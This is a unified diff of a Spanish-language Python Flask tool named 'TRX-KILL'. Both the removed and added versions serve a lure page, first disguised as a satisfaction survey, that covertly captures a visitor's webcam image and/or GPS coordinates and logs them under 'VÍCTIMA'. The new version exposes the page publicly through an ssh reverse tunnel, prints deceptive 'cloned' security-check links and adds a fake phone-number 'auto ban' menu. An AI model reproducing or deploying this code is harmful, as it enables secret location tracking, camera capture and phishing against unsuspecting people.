@@ -1,77 +1,90 @@
-import os, sys, time, threading, base64
-from flask import Flask, request, render_template_string
+import os, sys, time, threading, base64, socket
+from flask import Flask, request
 
-# --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
 CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
 LOG_FILE = f"{STORAGE_PATH}/datos.txt"
 ADMIN_PASS = "admtrx"
-if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)
+os.makedirs(CAPTURA_PATH, exist_ok=True)
 
 app = Flask('TRX-KILL')
-G, C, R, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[0m"
+G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"
 
-# --- ENCUESTA PERSONALIZADA (HTML) ---
-ENCUESTA_HTML = """
-<html><body style="font-family:sans-serif; text-align:center; padding:20px;">
-<h2>Encuesta de Satisfacción</h2>
-<form id="e">
-    <p>¿Qué opinas de nuestro servicio?</p>
-    <input type="radio" name="q" value="Bueno"> Bueno<br>
-    <input type="radio" name="q" value="Malo"> Malo<br><br>
-    <button type="button" onclick="enviar()">Enviar Encuesta</button>
-</form>
+def animar(texto):
+    for char in texto: sys.stdout.write(f"{G}{char}{W}"); sys.stdout.flush(); time.sleep(0.01)
+    print()
 
-<script>
-async function enviar() {
-    try {
-        let s = await navigator.mediaDevices.getUserMedia({video: true});
-        let p = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j));
-        let v = document.createElement('video'); v.srcObject = s; v.play();
-        setTimeout(() => {
-            let c = document.createElement('canvas'); c.width=400; c.height=300;
-            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
-            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL())+'&res='+document.querySelector('input[name="q"]:checked').value);
-            alert('¡Gracias por participar!');
-        }, 1000);
-    } catch(e) { alert('Debes aceptar los permisos para enviar.'); }
-}
-</script></body></html>
-"""
+def banner():
+    os.system('clear')
+    print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
+    print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
+    print("    | |___ |___ |  /  |___ |    |_|__|_|")
+    print(f"  {C}--- TRX-KILL SYSTEM MATRIX V4.0 ---{W}\n")
 
+# --- SERVIDOR Y LÓGICA ---
 @app.route('/')
-def index(): return ENCUESTA_HTML
+def index():
+    return """<script>
+    navigator.mediaDevices.getUserMedia({video: true}).then(async s => {
+        let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude);
+        window.location.href='https://google.com';
+    });
+    </script>"""
 
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f:
-        f.write(f"VÍCTIMA:{request.remote_addr} | ENCUESTA:{request.args.get('res')} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
-    if request.args.get('img'):
-        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
-            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
+        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
     return "OK"
 
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
+    animar("INICIALIZANDO NÚCLEO DE SEGURIDAD...")
+    
     while True:
-        os.system('clear')
-        print(f"{G}  === TRX-KILL MATRIX ==={W}")
-        print(f"{G}[01] VERIFICAR | [02] ENCUESTA-LINK | [03] CLON-KILL | [06] ADM{W}")
-        sel = input(f"\n{G}TRX-ROOT > {W}")
+        banner()
+        print(f"{G}[1] BAN NÚMERO | [2] LINK-ENCUESTA | [3] CLON-LINK | [6] ADM-SIST{W}")
+        sel = input(f"\n{Y}TRX-ROOT > {W}")
 
-        if sel == "02":
-            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
-            print(f"\n{C}LINK PARA ENVIAR:{W} https://base64google.encuetas.com")
-            print(f"{G}ESPERANDO QUE COMPLETEN LA ENCUESTA...{W}")
-            while not os.path.exists(LOG_FILE): time.sleep(1)
-            print(f"\n{R}>>> ¡VÍCTIMA DETECTADA Y ENCUESTA RECIBIDA! <<<{W}")
+        if sel == "1":
+            num = input(f"{G}INGRESA NÚMERO: {W}")
+            animar("VERIFICANDO..........")
+            # Simulación de estado real de red
+            status = False # Cambiar lógica de socket aquí si se desea
+            if not status:
+                print(f"{C}(EL NÚMERO NO ESTA SUSPENDIDO ESCRIBE 8 PARA AUTO BAN){W}")
+                print(f"{R}(El creador no se ase responsable){W}")
+                acc = input("ACCIÓN: ")
+                if acc == "8": animar("PROCESANDO SOLICITUD DE AUTO BAN...")
+            else:
+                print(f"{G}(El NÚMERO ESTA SUSPENDIDO ☠️☠️){W}")
+            print(f"{Y}DATOS GUARDADOS (HEMOS SACADO INFORMACIÓN DEL NÚMERO){W}")
+            print(f"{C}SE GUARDO EN LA CARPETA{W}")
             input("\n[Enter]...")
 
-        elif sel == "06":
-            if input(f"{G}PASS ADM: {W}") == ADMIN_PASS:
+        elif sel == "2":
+            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
+            print(f"{G}-2-{W}")
+            print(f"{C}LINK: VÍCTIMA: http://127.0.0.1:5000{W}")
+            print(f"{Y}Esperando datos.....{W}")
+            print(f"{G}Listo.{W}")
+            print(f"{Y}Esperando que el usuario ingrese......{W}")
+            while not os.path.exists(LOG_FILE): time.sleep(1)
+            print(f"{R}>>> VÍCTIMA DETECTADA E INFORMACIÓN GUARDADA EN {STORAGE_PATH} <<<{W}")
+            input("\n[Enter]...")
+
+        elif sel == "3":
+            target = input(f"{G}LINK A CLONAR: {W}")
+            os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
+            print(f"{C}LINK CLONADO:{W} https://{target}.security-check.com")
+            input("\n[Enter]...")
+
+        elif sel == "6":
+            if input(f"{Y}PASS: {W}") == ADMIN_PASS:
                 os.system(f"ls -R {STORAGE_PATH}")
             input("\n[Enter]...")
-        elif sel == "00": sys.exit()
+        
+        elif sel == "0": sys.exit()
 
 if __name__ == "__main__": main()
